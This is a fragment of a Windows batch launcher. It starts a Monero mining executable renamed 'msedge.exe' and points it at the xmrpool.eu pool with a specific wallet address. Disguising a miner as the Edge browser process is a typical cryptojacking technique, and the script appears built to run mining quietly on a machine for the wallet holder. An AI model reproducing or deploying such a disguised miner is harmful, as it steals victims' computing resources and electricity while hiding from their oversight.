...
::
:: Format:
::	msedge.exe -o <pool address>:<pool port> -u <pool username/wallet> -p <pool password>
::
:: Fields:
...
cd /d "%~dp0"
msedge.exe -o xmrpool.eu:3333 -u 48uJzCUCEbuB4EWhkbJ9hCAkUFbnUFZSGDLqizraNQbFBYhrmTYwoUp9284hmDWuySSvspLiSkCz9Jv7qATmU6QDR6eR6PC -p x
pause
